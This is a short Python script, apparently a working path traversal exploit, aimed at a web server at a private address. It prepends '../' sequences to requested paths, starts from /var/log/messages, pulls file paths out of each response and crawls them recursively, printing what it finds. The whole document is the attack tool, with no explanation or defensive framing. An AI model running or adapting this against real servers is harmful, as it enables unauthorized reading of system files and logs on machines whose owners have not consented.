import requests
from requests.exceptions import HTTPError
import re


def request_file(path):
    url = "http://192.168.2.16/../../../../../" + path
    response = requests.get(url)
    response.raise_for_status()
    return response.content

def find_files(content):
    matches = re.findall(b"/[a-zA-Z0-9._/-]+", content)
    return {m.decode("ASCII") for m in matches}

done = set()
queue = ["/var/log/messages"]

while queue:
    path = queue.pop(0)
    try:
        response = request_file(path)
        files = find_files(response)
        remain = [f for f in files if f not in done]
        for f in remain:
            print("%s -> %s" % (path, f))
        queue.extend(remain)
    except HTTPError:
        pass
    done.add(path)
